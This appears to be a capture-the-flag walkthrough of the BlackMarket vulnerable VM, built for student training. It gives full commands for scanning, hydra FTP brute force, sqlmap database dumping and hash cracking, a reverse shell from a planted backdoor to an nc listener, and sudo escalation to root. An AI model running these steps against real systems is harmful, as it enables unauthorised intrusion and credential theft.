									BlackMarket VM presented at Brisbane SecTalks BNE0x1B (28th Session) which is focused on students and other InfoSec Professional. This VM has a total of 6 flags and one r00t flag. Each Flag leads to another Flag and flag format is flag {blahblah}. Download it from here.
VM Difficulty Level: Beginner/Intermediate
Penetrating Methodology

Network Scanning (Nmap, netdiscover)
Information gathering:
Abusing web browser for the 1st flag
Generate dictionary (Cewl)
FTP brute-force (hydra)
FTP login for the 2nd flag
SQL injection for the 3rd flag
Blackmarket login for the 4th flag
Squirrel mail login for the 5th flag
Get cipher mail from inside Inbox. Draft
Decipher the mail and reach to backdoor.php
Upload backdoor shell
Netcat session for the 6th flag
Import python one-liner for proper TTY shell
Sudo Rights Privilege Escalation
Get Root access and capture the flag.

 Let’s Breach!!!
Let’s start with getting to know the IP of VM (Here, I have it at 192.168.1.104 but you will have to find your own).

		
		
			
			
			
			
netdiscover
			
				
					
				
					1
				
						netdiscover
					
				
			
		


Now let’s move towards enumeration in context to identify running services and open of victim’s machine by using the most popular tool Nmap.

		
		
			
			
			
			
nmap -A 192.168.1.104
			
				
					
				
					1
				
						nmap -A 192.168.1.104
					
				
			
		

As you can observe it has dumped a lot of details related to open ports and services running through them.

Knowing port 80 is open in the victim’s network I preferred to explore his IP in a browser. It put-up a Blackmarket login page but we don’t have credential yet, therefore, we like to view its source code for getting a clue.

BOOOMMM!! Luckily I found the 1st flag from its source code which was in base64.
flag1 {Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=}

Since the 1st flag was the base64 encoded so we try to decode it with help of the following syntax.
Syntax: echo ‘base64 encoded text’ | base64 -d
WoW!! It sounds CIA Operation Treadstone…………………

With help of Google I found this link and after reading the whole article it becomes clear to me what CIA Operation Treadstone is all about and why flag 1 has held it secretly. Might be Black-market login credential could be extracted from here, therefore I decide to generate a dictionary with help of ‘Jason Bourne’ movie’s character. By executing the following command, we generated a wordlist for username and password dictionary and save it as dict.txt.

		
		
			
			
			
			
cewl http://bourne.wikia.com/wiki/Operation_Treadstone -d 2 -w /root/Desktop/dict.txt
			
				
					
				
					1
				
						cewl http://bourne.wikia.com/wiki/Operation_Treadstone -d 2 -w /root/Desktop/dict.txt
					
				
			
		


As we knew port 21 is open FTP, therefore, we use the above dictionary for FTP brute-force attack with help of hydra.

		
		
			
			
			
			
hydra -L dict.txt -P dict.txt 192.168.1.104 ftp
			
				
					
				
					1
				
						hydra -L dict.txt -P dict.txt 192.168.1.104 ftp
					
				
			
		

Successfully found FTP-login user: nicky password: CIA

Then with help above credential, we logged into FTP and enumerate IMP.txt from inside /IMPFiles and download it with the help of the following command.

		
		
			
			
			
			
ftp 192.168.1.104
ls -al
cd ftp
ls -al
cd IMPFiles
ls -al
get IMP.txt
			
				
					
				
					1234567
				
						ftp 192.168.1.104ls -alcd ftpls -alcd IMPFilesls -alget IMP.txt
					
				
			
		


With help of cat command, we open the IMP.txt file and found flag2 from inside it.  Here also we read the given message and analysis the given hint “CIA blackmarket Vehicle workshop”.

		
		
			
			
			
			
cat IMP.txt
			
				
					
				
					1
				
						cat IMP.txt
					
				
			
		

flag2 {Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}

Looking at above hint I focus on “Vehicle workshop” and start examining the web browser for every possible directory having Vehicle/workshop and Unfortunately I retrieved following web page when tried 

		
		
			
			
			
			
http://192.168.1.104/vworkshop
			
				
					
				
					1
				
						http://192.168.1.104/vworkshop
					
				
			
		

It was a dashboard of the Black-Market Auto Workshop.

After examining the whole dashboard we check-out the Spare Parts and observe its web page and URL. So we decide to use SQLMAP against for SQL injection.

Then execute the following command for fetching its database name with help of sqlmap.

		
		
			
			
			
			
sqlmap -u http://192.168.1.104/vworkshop/sparepartsstoremore.php?sparepartid=1 --dbs --batch
			
				
					
				
					1
				
						sqlmap -u http://192.168.1.104/vworkshop/sparepartsstoremore.php?sparepartid=1 --dbs --batch
					
				
			
		


Here I found some database names and as per my consideration, it should be blackmarket therefore without wasting time I step ahead for fetching tables from inside it.


		
		
			
			
			
			
sqlmap -u http://192.168.1.104/vworkshop/sparepartsstoremore.php?sparepartid=1 -D BlackMarket --dump-all --batch
			
				
					
				
					1
				
						sqlmap -u http://192.168.1.104/vworkshop/sparepartsstoremore.php?sparepartid=1 -D BlackMarket --dump-all --batch
					
				
			
		

Here I  found a table “flag” and capture the 3rd flag from here.
Flag3 Find Jason Bourne Email access.

Then we have fetched table “user” and found usernames with their hash passwords.

With help of the online MD-5 decrypting tool, we decode above-enumerated hashes and found following.
Username: admin |password:  cf18233438b9e88937ea0176f1311885 MD5: BigBossCIA
Username: user |password:  0d8d5cd06832b29560745fe4e1b941cf md5 (md5($pass)) : user

Then again we explore target IP in the browser and enter following credential for login.

		
		
			
			
			
			
admin
BigBossCIA
			
				
					
				
					12
				
						adminBigBossCIA
					
				
			
		

It put-up a pop with flag 4 along with a message as shown.
flag4{bm90aGluZyBpcyBoZXJl}
Jason Bourne Email access ?????

From Inside customers, I got email Id [email protected] of user Jason Bourne.

At this stage I felt to use Dirb for a directory brute-force attack, here we notice /squirrelmail/ and for sure we will be going to get something from here.

So we explore following URL http://192.168.1.104/squirrelmail/ and enter given below credential as described in the 4th flag (Jason Bourne Email access ?????)
Username: [email protected]
Password: ?????
It gives the following mailbox as shown and I start further enumeration.

Then while inspecting INBOX. Drafts I found the 5th flag from inside IMPORTANT MESSAGE mail.
Flag5 {RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=}
And after reading this we find some encoded text which needs to be decoded.

Then I decoded the above text as shown and after reading it, I concluded that there should be a “passpass.jpg” under a directory /kgbbackdoor inside Blackmarket workshop which will take us to the actual backdoor.

So without wasting time I look for the above-said path.

		
		
			
			
			
			
http://192.168.1.104/vworkshop/kgbbackdoor/PassPass.jpg
			
				
					
				
					1
				
						http://192.168.1.104/vworkshop/kgbbackdoor/PassPass.jpg
					
				
			
		

hhheheyy!!! This image must be hiding something inside, let’s download it

Then I use string tool and enter the following command to extract metadata from inside it.

		
		
			
			
			
			
strings PassPass.jpg
			
				
					
				
					1
				
						strings PassPass.jpg
					
				
			
		

Here we found something interesting.

		
		
			
			
			
			
Pass = 5215565757312090656
			
				
					
				
					1
				
						Pass = 5215565757312090656
					
				
			
		


Since the above extract metadata “Pass” which could be the possible password, and we can use this for further approach, therefore, we try to decode it. As it was in decimal (5215565757312090656) format so first, we decode it into hex (4861696C4B474220) then decode it into ascii and obtained “HailKGB”

As slowly and gradually we are moving towards our goal as it getting more-and-more hectic for me. After penetrating more I reached following URL where you will found Page Not Found error message…….

		
		
			
			
			
			
http://192.168.1.104/vworkshop/kgbbackdoor/backdoor.php
			
				
					
				
					1
				
						http://192.168.1.104/vworkshop/kgbbackdoor/backdoor.php
					
				
			
		

BANG ON Dear, it is an illusion because at this page you will get a hidden login form as declared in the encrypted mail. Still, if you have any confusion, please read above decoded text message drop for Dimitri one more time, everything will be cleared to you.

B0000MMM!!! Here we have access the backdoor about whom the sender has informed to Dimitri.

Now let’s enter attacker IP: 192.168.1.107 and listening port 4444 and then start netcat listen in a new terminal to get victim’s reverse connection.

		
		
			
			
			
			
nc -lvp 4444
			
				
					
				
					1
				
						nc -lvp 4444
					
				
			
		


With help of netcat, we successfully spawn pty shell of victim’s VM machine then open flag.txt with help of cat command and found 6th the last flag of this VM. Now we need to get root access to finish this challenge.
cat flag.txt
flag6{Um9vdCB0aW1l}

		
		
			
			
			
			
cd /home
ls -al
cd .Mylife
ls -al
cat .Secret
			
				
					
				
					12345
				
						cd /homels -alcd .Mylifels -alcat .Secret
					
				
			
		

while reading the message I notice something prodigious i.e. DimitriHateApple because the file is named as secret, therefore, I took DimitriHateApple as the password for user: Dimitri

Then I try to login with Dimitri and for that, I execute the following command to access proper terminal.

		
		
			
			
			
			
python -c 'import pty; pty.spawn("/bin/bash")'
su dimitri
DimitriHateApple
			
				
					
				
					123
				
						python -c 'import pty; pty.spawn("/bin/bash")'su dimitriDimitriHateApple
					
				
			
		

Great!!! We login successfully now let’s try privilege escalation for root access.
I was shocked when I checked sudo rights for user Dimitri because I notice ALL Privilege are allotted.

		
		
			
			
			
			
sudo -l
(ALL : ALL) ALL
sudo su
			
				
					
				
					123
				
						sudo -l(ALL : ALL) ALLsudo su
					
				
			
		

Yehhh!! We own root access.


		
		
			
			
			
			
cd /root
ls
cat THEEND.txt
			
				
					
				
					123
				
						cd /rootlscat THEEND.txt
					
				
			
		

HURRAYYYY!!!! We finished this challenge.
Happy Hacking
